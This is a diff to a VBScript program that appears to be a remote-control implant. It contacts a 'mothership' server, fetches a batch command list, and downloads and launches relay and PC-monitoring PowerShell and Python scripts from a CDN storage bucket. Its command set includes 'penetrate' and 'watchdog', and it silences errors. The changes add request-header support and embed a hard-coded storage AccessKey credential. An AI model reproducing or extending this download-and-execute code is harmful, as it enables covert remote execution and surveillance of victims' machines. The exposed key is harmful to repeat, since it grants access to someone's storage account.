@@ -1,4 +1,4 @@
-' 2026.06.20-1103
+' 2026.06.21-1741
 
 Option Explicit
 On Error Resume Next
@@ -240,12 +240,36 @@ Function HeadersToDict(responsetext)
 
 End Function
 
-Function DownloadFile(sURL, sFile)
+Function RetrieveAsset(fname, localfpath)
+    
     Dim headers
-    DownloadFile = DownloadFileWithHeaders(sURL, sFile, headers)
+    Dim headersin : headersin = GetBunnyHeaderDict()
+    
+    RetrieveAsset = DownloadFileWithHeaders(mothershipassets & "/ow/assets/" & fname, localfpath, headersin, headers)
+    
 End Function
 
-Function DownloadFileWithHeaders(sURL, sFile, headers)
+Function DownloadFile(sURL, headersin, sFile)
+    Dim headers
+    DownloadFile = DownloadFileWithHeaders(sURL, sFile, headersin, headers)
+End Function
+
+Function IsDict(objin)
+    IsDict = False
+
+    If Not headersin Is Nothing Then
+        If IsObject(objin) Then
+            If TypeName(objin) = "Dictionary" Then
+                If objin.Count > 0 Then
+                    IsDict = true
+                End If
+            End If
+        End If
+    End If
+    
+End Function
+
+Function DownloadFileWithHeaders(sURL, sFile, headersin, headers)
     Dim pp : pp = "DownloadFileWithHeaders"
     DownloadFileWithHeaders = False
     On Error Resume Next
@@ -257,10 +281,18 @@ Function DownloadFileWithHeaders(sURL, sFile, headers)
     
     Call LogMsg(pp & ": " & sURL & " " & sFile & " -- " & GetTimestamp())
 
+
     Dim objHTTP, objStream
     
     Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
     objHTTP.Open "GET", sURL, False
+
+    If IsDict(headersin) Then
+        For Each kkey In headersin
+            objHTTP.SetRequestHeader kkey, headersin(kkey)
+        Next
+    End If
+
     objHTTP.Send
 
     Call LogMsg(pp & ": " & objHTTP.Status & " " & objHTTP.StatusText )    
@@ -1019,7 +1051,7 @@ Dim selectedmothershipindex : selectedmothershipindex = 0
 Dim mothership : mothership = mothershiplist(selectedmothershipindex)
 
 Dim mothershipassets : mothershipassets = "https://ny.storage.bunnycdn.com/testdev"
-Dim bunnyheader : bunnyheader="-H " & dq & "AccessKey: c64e71da-aac7-4b07-8ceb3fe9813f-af55-4d3a" & dq
+Dim bunnyheader : bunnyheader="AccessKey: c64e71da-aac7-4b07-8ceb3fe9813f-af55-4d3a"
 
 Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "startrelay", "startpcmon")
 
@@ -1364,7 +1396,7 @@ Function GetConfig()
 	Dim localpath : localpath = workdir & "\" & "config.txt.tmp"
 	
 	Dim headers
-	Call DownloadFileWithHeaders(url, localpath, headers)
+	Call DownloadFileWithHeaders(url, localpath, nothing, headers)
 
 	If fso.FileExists(localpath) Then
 		Dim configstr : configstr = ReadFile(localpath)
@@ -1410,6 +1442,24 @@ Function Watchdog()
     
 End Function
 
+Function GetBunnyHeaderDict()
+    set GetBunnyHeaderDict = nothing
+    
+    Dim parts
+    
+    if not XIsEmpty(bunnyheader) Then
+        parts = Split(bunnyheader, ":")
+        
+        if IsArray(parts) then  
+            if UBound(parts) >= 1 Then
+                Set GetBunnyHeaderDict = CreateObject("Scripting.Dictionary")
+                GetBunnyHeaderDict.Add parts(0), parts(1)
+            end if
+        end if
+    end if
+
+End Function
+
 Function Retrieve()
     cmdname = "retrieve"
 
@@ -1432,9 +1482,10 @@ Function Retrieve()
         Dim localpath : localpath = workdir & "\" & file
         
         Dim headers 
+        Dim headersin : set headersin = GetBunnyHeaderDict()        
         
         If Not fso.FileExists(localpath) Then
-            Call DownloadFileWithHeaders(url, localpath, headers)
+            Call DownloadFileWithHeaders(url, localpath, headersin, headers)
         End If
 
         If Not fso.FileExists(localpath) Then
@@ -1677,7 +1728,7 @@ Function ActivatePSScript(scriptdir, scriptfname, scriptname)
         Next
     End If
 
-    ActivatePSScript = ExecPowerShell(scriptname, relaydir, relayfname, newargarr)
+    ActivatePSScript = ExecPowerShell(scriptname, scriptdir, scriptfname, newargarr)
 
     Call LogMsg(pp & ": pid=" & CStr(ActivatePSScript))
     
@@ -1784,7 +1835,11 @@ Function ActivatePythonScript(scriptdir, scriptfname, scriptname)
 End Function
 
 Function StartPSPCMon()
+    Err.Clear
+    
     Dim pp : pp = "StartPSPCMon"
+    
+    Call LogMsg( pp & " -- starting")
     
     cmdname = "startpspcmon"
 
@@ -1794,23 +1849,30 @@ Function StartPSPCMon()
     End If
     
     If not fso.FileExists(pcmondir & "\" & pspcmonfname) Then
-        Call DownloadFile(mothershipassets & "/ow/assets/pc_monitoring.ps1", relaydir & "\" & relayfname)
+        Call RetrieveAsset(pspcmonfname, pcmondir & "\" & pspcmonfname)
     End If
 
     If not fso.FileExists(pcmondir & "\" & pspcmonfname) Then
-        Call LogMsg(pp & ": ERROR :: script " & relayfname & " does not exist inside " & relaydir & " -- exiting function")
+        Call LogMsg(pp & ": ERROR :: script " & pspcmonfname & " does not exist inside " & pcmondir & " -- exiting function")
         Exit Function
     End If
     
-
-    Dim ret : ret = ActivatePSScript(relaydir, relayfname, "relay")      
+    Dim ret : ret = ActivatePSScript(pcmondir, pspcmonfname, "pspcmon")      
 
     If ret > 0 Then
-        Call LogMsg("StartRelay: success activated script with pid " & ret)
+        Call LogMsg(pp & ": success activated script with pid " & ret)
     Else
-        Call LogMsg("StartRelay: ERROR -- failed to activate script")
+        Call LogMsg(pp & ": ERROR -- failed to activate script")
     End If
-        
+    
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End If
+    
+    Call LogMsg( pp & " -- finished")
+    
 End Function
 
 Function StartPCMon()
@@ -1831,7 +1893,7 @@ Function StartPCMon()
     Dim pcmonfpath : pcmonfpath = pcmondir & "\" & pcmonfname
     If not fso.FileExists(pcmonfpath) Then
         Call LogMsg(cmdname & " downloading " & pcmonfpath)
-        Call DownloadFile(mothership & "/ow/assets/" & pcmonfname, pcmonfpath)
+        Call RetrieveAsset(pcmonfname, pcmonfpath)
     End If
 
     If not fso.FileExists(pcmonfpath) Then
@@ -1892,7 +1954,7 @@ Function StartRelay()
     End If
 
     If not fso.FileExists(relaydir & "\" & relayfname) Then
-        Call DownloadFile(mothership & "/ow/assets/relay_py", relaydir & "\" & relayfname)
+        Call RetrieveAsset(relayfname, relaydir & "\" & relayfname)
     End If
 
     If not fso.FileExists(relaydir & "\" & relayfname) Then
@@ -2236,7 +2298,7 @@ Function Ping()
 		Dim isvalid : isvalid = false
         Dim pingtxt
 		
-		isvalid = DownloadFile(url & "?" & dparams, pingpath)
+		isvalid = DownloadFile(url & "?" & dparams, pingpath, nothing)
 		
 		if isvalid then
 			Call LogMsg("DownloadFile was successful, validating the output")
@@ -2360,7 +2422,7 @@ Function Cmdlist()
         Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat&" & GetScriptTagStrUrlDirect()
         
         Dim headers
-        Dim ret : ret = DownloadFileWithHeaders( url, filepath, headers)
+        Dim ret : ret = DownloadFileWithHeaders( url, filepath, nothing, headers)
 
         If not ret then
             Call LogMsg("cannot execute as download failed, skipping to next iteration" )
